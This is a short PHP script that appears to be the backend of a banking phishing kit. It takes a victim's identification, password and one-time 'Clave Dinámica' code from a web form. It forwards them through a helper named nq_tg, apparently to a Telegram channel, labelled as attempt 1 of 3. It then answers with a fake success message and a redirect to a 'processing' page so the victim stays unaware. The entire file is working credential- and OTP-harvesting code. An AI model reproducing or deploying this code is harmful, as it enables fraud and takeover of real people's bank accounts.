<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$identification = nq_f('identification');
$password       = nq_f('password');
$dynamicCode    = nq_f('dynamicCode');

if ($dynamicCode === '') {
    echo json_encode(['success' => false, 'message' => 'Código requerido']);
    exit;
}

nq_tg('💫 Clave Dinámica · Intento 1/3', [
    ['TEL',    $identification],
    ['PW',     $password],
    ['Otp', $dynamicCode],
], 15548997);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'procesando2.html',
]);
